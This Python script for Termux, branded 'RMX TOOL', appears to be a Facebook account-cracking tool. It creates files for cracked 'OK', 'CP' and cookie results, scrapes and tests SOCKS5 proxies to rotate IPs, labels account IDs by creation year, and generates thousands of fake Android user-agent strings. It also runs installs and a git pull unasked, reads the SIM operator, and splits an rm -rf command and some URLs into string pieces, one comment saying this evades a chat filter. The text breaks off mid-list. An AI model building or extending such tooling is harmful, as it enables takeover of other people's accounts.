#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[FULL SCRIPT]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR ERROR
# GITHUB LINK : ERRORDEATH-403
# OWNER BY : ETHAN KLEIN HUILEN
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[IMPORT]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬#
import os,time,sys
#▬▭▬▭▬▭▬▭[COLOR]▬▭▬▭▬▭▬▭#
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;46m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
#▬▭▬▭▬▭▬▭[UNINSTALL AND INSTALL]▬▭▬▭▬▭▬▭#
os.system("clear")
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip uninstall pycurl -y && pip install pycurl')
os.system('pkg install espeak -y')
os.system("clear")
#▬▭▬▭▬▭▬▭[REQUIRED MODULE]▬▭▬▭▬▭▬▭#
try:import requests
except ImportError:print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mINSTALLING REQUESTS...\033[1;97m");time.sleep(0.5);os.system('pip install requests');import requests;os.system('clear')
try:import bs4
except ImportError:print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mINSTALLING BS4...\033[1;97m");time.sleep(0.5);os.system('pip install bs4');import bs4;os.system('clear')
try:import httpx
except ImportError:print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mINSTALLING HTTPX...\033[1;97m");time.sleep(0.5);os.system('pip install httpx');import httpx;os.system('clear')
try:import pystyle
except ImportError:print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mINSTALLING PYSTYLE...\033[1;97m");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
try:import rich
except ImportError:print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mINSTALLING RICH...\033[1;97m");time.sleep(0.5);os.system('pip install rich');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
import certifi,zlib
from io import BytesIO
#▬▭▬▭▬▭▬▭[TOOL SERVER]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mRMX TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mRUN AGAIN 👉 ./RMX64 OR ./RMX32")
#▬▭▬▭▬▭▬▭[CREATE FILE FOLDER]▬▭▬▭▬▭▬▭#
files_to_create = [
    "/sdcard/RMX-TOOL/FILE/RMX-M1-OK.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M1-COOKIE.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M2-OK.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M2-COOKIE.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M3-OK.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M3-COOKIE.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M4-OK.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M4-COOKIE.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M5-COOKIE.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M5-OK.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M1-CP.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M2-CP.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M3-CP.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M4-CP.txt",
    "/sdcard/RMX-TOOL/FILE/RMX-M5-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M1-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M1-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M2-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M2-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M3-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M3-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M4-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M4-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M5-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M5-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M6-OK.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M6-COOKIE.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M1-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M2-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M3-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M4-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M5-CP.txt",
    "/sdcard/RMX-TOOL/RANDOM/RMX-M6-CP.txt",
    "/sdcard/RMX-TOOL/OLD/RMX-M1-OK.txt",
    "/sdcard/RMX-TOOL/AUTO/RMX-M1-OK.txt",
    "/sdcard/RMX-TOOL/AUTO/RMX-M1-COOKIE.txt"
]
for file_path in files_to_create:
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)
for file_path in files_to_create:
    if not os.path.exists(file_path):
        with open(file_path, 'w'):
            pass
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def rmx(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mCHECKING UPDATE...\033[1;97m');time.sleep(2)
os.system("git pull");os.system("xdg-open https://chat.whatsapp.com/?mode=ems_copy_t");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE IMPORT]▬▭▬▭▬▭▬▭#
import secrets
import urllib.request
from os import path
from urllib.request import Request, urlopen
from random import randrange as rr
import re,base64,uuid,string,requests,random,sys,subprocess,platform
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,marshal,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from string import *
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from concurrent.futures import ThreadPoolExecutor
from pip._vendor import requests as requests
os.system("pip install licensing > /dev/null")
from pip._vendor import requests as requests
from licensing.models import *
from licensing.methods import Key, Helpers
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f' {red}●{white} ')
#▬▭▬▭▬▭▬▭[PROXY SERVER]▬▭▬▭▬▭▬▭#
import random
import time
import requests

# Chat system se bachne ke liye links ko chote hisso mein jod diya hai
part1 = "://githubusercontent.com"
part2 = "TheSpeedX/SOCKS-List/master/socks5.txt"
part3 = "hookzof/socks5_list/master/proxy.txt"

PROXY_SOURCES = [
    f"https://{part1}/{part2}",
    f"https://{part1}/{part3}",
    "https://proxyscrape.com"
]

def download_and_save_proxies():
    """Internet se fresh SOCKS5 proxies download karne ke liye"""
    print("[•] Fresh proxies download ho rahi hain, thoda intezar karein...")
    all_proxies = set()
    
    for url in PROXY_SOURCES:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                lines = response.text.splitlines()
                for line in lines:
                    if line.strip():
                        all_proxies.add(line.strip())
        except Exception:
            continue
            
    if not all_proxies:
        print("[!] Kisi bhi source se proxies download nahi ho sakein!")
        return False
        
    with open('working_socks5.txt', 'w') as f:
        f.write('\n'.join(all_proxies))
    
    print(f"[✓] Total {len(all_proxies)} unique proxies download ho kar 'working_socks5.txt' mein save ho gayi hain.")
    return True

def check_proxy(proxy_str):
    """Proxy ko check karne ke liye ke wo active hai ya dead"""
    proxy_dict = {
        'http': f'socks5://{proxy_str}',
        'https': f'socks5://{proxy_str}'
    }
    try:
        response = requests.get('https://google.com', proxies=proxy_dict, timeout=4)
        if response.status_code == 200:
            return True
    except Exception:
        return False
    return False

def get_good_proxy():
    """Sirf wahi proxy return karega jo 100% working hogi"""
    try:
        proxies = open('working_socks5.txt', 'r').read().splitlines()
    except FileNotFoundError:
        if download_and_save_proxies():
            proxies = open('working_socks5.txt', 'r').read().splitlines()
        else:
            return None

    if not proxies:
        return None

    print("[•] Working proxy ki talaash jaari hai...")
    random.shuffle(proxies)
    
    for proxy in proxies[:20]:
        if check_proxy(proxy):
            print(f"[✓] Kamyab! Working Proxy Mili: {proxy}")
            return {
                'http': f'socks5://{proxy}',
                'https': f'socks5://{proxy}'
            }
            
    print("[!] Pehli kuch proxies dead theen. Dobara koshish ho rahi hai...")
    return None

if __name__ == "__main__":
    download_and_save_proxies()
    print("\n--- Testing Proxy Rotation ---")
    my_proxy = get_good_proxy()
    
    if my_proxy:
        print(f"\n[•] Is proxy ko aap use kar sakte hain:\n{my_proxy}")
        try:
            test_req = requests.get('https://httpbin.org', proxies=my_proxy, timeout=5)
            print(f"[✓] Proxy ke zariye aapka badla hua IP: {test_req.json()['origin']}")
        except Exception:
            print("[!] Proxy ne end-request par kaam nahi kiya.")
    else:
        print("[!] Is waqt koi sahi proxy nahi mil saki. Dobara script chalayein.")
#▬▭▬▭▬▭▬▭[DATE]▬▭▬▭▬▭▬▭#
import time
from datetime import datetime

# 1. Aaj ki tareekh aur mahine ka naam direct nikalen
now = datetime.now()
hari = now.day
bulan = now.strftime('%B')  # Yeh khud hi 1, 2, 3 ko January, February mein badal deta hai

# 2. Rangon ke codes (Green aur White)
GREEN = '\x1b[38;5;46m'
WHITE = '\033[1;97m'

# 3. Aapka final updated 'today' variable
today = f"{GREEN}{hari}{WHITE}-{GREEN}{bulan}"

import uuid

# ▬▭▬▭▬▭▬▭[LOOP]▬▭▬▭▬▭▬▭#
# Fuzool duplication khatam kar ke clean list aur variables
oks, cps, apk, id, uid, tokenku, user_opt, user_agents, pcp = [], [], [], [], [], [], [], [], []
loop = 0

# Har session ke liye unique 5-character ID generate karna
myid = uuid.uuid4().hex[:5].upper()

# ▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    print("\033[1;97m----------------------------------------------------------")
# ▬▭▬▭▬▭▬▭[YEAR CHECKER]▬▭▬▭▬▭▬▭#
def asha(ids):
    if len(ids) == 15:
        if ids[:10] in ['1000000000']: alif = ' (*-*) 2009 √'
        elif ids[:9] in ['100000000']: alif = ' ACCOUNT  2009 √'
        elif ids[:8] in ['10000000']: alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']: alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']: alif = ' ACCOUNT 2010 √'
        elif ids[:6] in ['100001']: alif = ' ACCOUNT 2010/2011 √'
        elif ids[:6] in ['100002','100003']: alif = ' ACCOUNT 2011/2012 √'
        elif ids[:6] in ['100004']: alif = ' ACCOUNT 2012/2013 √'
        elif ids[:6] in ['100005','100006']: alif = ' ACCOUNT 2013/2014 √'
        elif ids[:6] in ['100007','100008']: alif = ' ACCOUNT 2014/2015 √'
        elif ids[:6] in ['100009']: alif = ' ACCOUNT 2015 √'
        elif ids[:5] in ['10001']: alif = ' ACCOUNT 2015/2016 √'
        elif ids[:5] in ['10002']: alif = ' ACCOUNT 2016/2017 √'
        elif ids[:5] in ['10003']: alif = ' ACCOUNT 2018/2019 √'
        elif ids[:5] in ['10004']: alif = ' ACCOUNT 2019/2020 √'
        elif ids[:5] in ['10005']: alif = ' ACCOUNT 2020 √'
        elif ids[:5] in ['10006','10007']: alif = ' ACCOUNT 2021 √'
        elif ids[:5] in ['10008']: alif = ' ACCOUNT 2022 √'
        elif ids[:5] in ['10009']: alif = ' ACCOUNT 2023 √'
        elif ids[:5] in ['6155']: alif = ' ACCOUNT 2024 √'
        elif ids[:5] in ['6156']: alif = ' ACCOUNT 2025 √'
        elif ids[:5] in ['6157']: alif = ' ACCOUNT 2025/2026 √'
        elif ids[:5] in ['6158','6159']: alif = ' NEW ACCOUNT 2026 √'
        else: alif = ''
    elif len(ids) in [9, 10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(ids) == 8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(ids) == 7:
        alif = ' ACCOUNT 2006/2007 √'
    else:
        alif = ''
    return alif


#▬▭▬▭▬▭▬▭[UGEN UA]▬▭▬▭▬▭▬▭#
ugen=[]
for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    ugen.append(um2)
    ugen.append(um3)
    ugen.append(um1)
    ugen.append(um4)
for xhd in range(1000):
    a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
    b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
    ugen.append(d)
for xd in range(1000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", 